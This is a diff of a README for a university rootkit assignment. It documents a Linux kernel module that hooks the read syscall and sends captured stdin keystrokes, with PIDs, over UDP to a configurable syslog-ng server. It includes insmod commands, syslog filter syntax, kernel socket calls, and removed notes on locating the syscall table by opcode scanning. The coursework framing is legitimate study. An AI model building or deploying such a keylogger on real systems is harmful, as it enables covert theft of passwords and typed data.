@@ -1,47 +1,66 @@
-Assignment 8: Finding Data Structures
+Assignment 9: Network Keu-logging
 ------------------------------------------------------------------------------------
 Credits
     Nicolas Appel
     Wenwen Chen
 ------------------------------------------------------------------------------------
 Description
-    - Obtain syscall table adress dynamically
-    - Hook read call and printk stdin
+    - Hook read call and send stdin data via UDP packets to syslg-ng server
+    - PID information is included in syslog protocol header
 ------------------------------------------------------------------------------------
 Documentation
 ------------------------------------------------------------------------------------
 Installation instructions
     - Compile the module
       # make
-    - Insert the module
-      # insmod rootkit.ko 
+    - Insert the module, ip and port of the syslog-ng server can be spcified by 
+      following command line arguments. Default ip is "127.0.0.1" and port is 514
+      # insmod rootkit.ko [ip="xxx.xxx.xxx.xxx"] [port=xx]
     - Remove the module
       # rmmod rootkit    
 ----------------------------------------------------------------------------------
 Technical note
-INT 0x80 was replaced by SYSCALL and SYSENTER for 64-bit system calls. These processor
-functions don't directly jump into a function in the IDT but call a handler provided
-by the OS. The handler's address is located in the LSTAR machine special register.
+    - syslog-ng can be configured to read log messages from a remote server and 
+      forwards them to the appropriate "destinations".
+      To open a port to read log messages via UDP, one has to specify it in syslog-ng.conf
+      The following syntax should be used:
+        source s_net { udp(); };
+      By default, the remote server will listen on port 514. The listing port and
+      ip address of the server can also be specified with the following syntax:
+        source s_net { udp(ip(127.0.0.1) port(8000))}
+      To get syslog messages from the remote server, destinations, filters for messages
+      and log paths should be also defined in syslog-ng config file.
+    - According to RFC 5424, a syslog message consists of mainly three parts:
+      - PRI (priority value)
+          PRI is the sum of facility * 8 + severity in angle brackets. E.g. User-level
+          messages have the facility 1 and informational messages have the severity 6.
+          Then the PRI of a user-lvel informational message is <14>. 
+          Our key logging messages have alreays PRI 14, hence the following filter 
+          syntax can be used to filter our logging messages in syslog-ng:
+            filter f_rootkit { level{info} and facility(user); };
+      - Other header information like TIMESTAMPS, HOSTNAME, APP-NAME etc.
+          Syslog-ng will automatically add TIMESTAMPS and HOSTNAME, if no timestamps 
+          and host name are contained in the massage packets. 
+          Our key logging messages have additional header information: keylogging[pid].
+      - MSG (free-form message)
+      Our key logging messages printed by syslog-ng will looks like:
+        Dec 12 02:13:02 127.0.0.1 keylogging[2184]: k
 ----------------------------------------------------------------------------------
 Implementation Details
-     - find_syscall_table: This method does all the work:
-	Get the address of the system_call handler using the rdmsrl function (read 
-	machine special register long, indicating a 64-bit address). Scan the memory
-	at the address of the system_call handler for the "call *syscall_table(,%rax,8)"
-	assembly instruction, encoded by the sequence 0xFF 0x14 0xC5. See comment in 
-	hooking.c :	
-		/*
-		* IA64 opcode for: "call *syscall_table(,%rax,8)" see arch/x86/kernel/entry_64.S:629
-		* 0xFF Call
-		* 0x14 ModRM: .mod=00 (register indirect addressing), 
-		*		.reg=100 (use sib), .rm=101 (rip relative addressing)
-		* 0xC5 SIB: scale: 11 (2^3), index: 000 (RAX), base: 101 (disp32)
-		*/
-	The following 32-bit address contains the lower part of the address of the syscall table,
-	which then is or-ed bitwise with 0xffffffff00000000 because the RIP relative addressing
-	omits the first 32-bits of the address.
-     - Read call hooking: see previous readmes.	
+    - void prepare_keylogging(void): create UDP socket and connect it with 
+      syslog-ng server
+      struct socket *sock;  // General BSD socket defined in linux/net.h
+      sock_create(AF_INET, SOCK_DGRAM, IPPRPTP_UDP, &sock) // Create a socket for
+      IPv4 Internet protocols (familia AF_INET), supporting datagrams (type 
+      SOCK_DGRAM) and using UDP protocol (protocol IPPROTO_UDP)
+    - void send_udp(int, char *): Send UDP packets with PID (first argument)
+      and keylogging data (second argument) using the kernel funciton:
+        int sock_sendmsg(struct socket *, struct msghdr *, size_t size);
+      Sent messages are in syslog messages format described above.
+    - void release_keylogging(void): close the socket using the kernel function:
+        void sock_release(struct socket *);
 -----------------------------------------------------------------------------------
 Additional Notes
 			To unload the module, all other terminal sessions have to disconnect or write to stdin.
+      Our module will wait until all currently exulting my_read function calls are finished. 
 
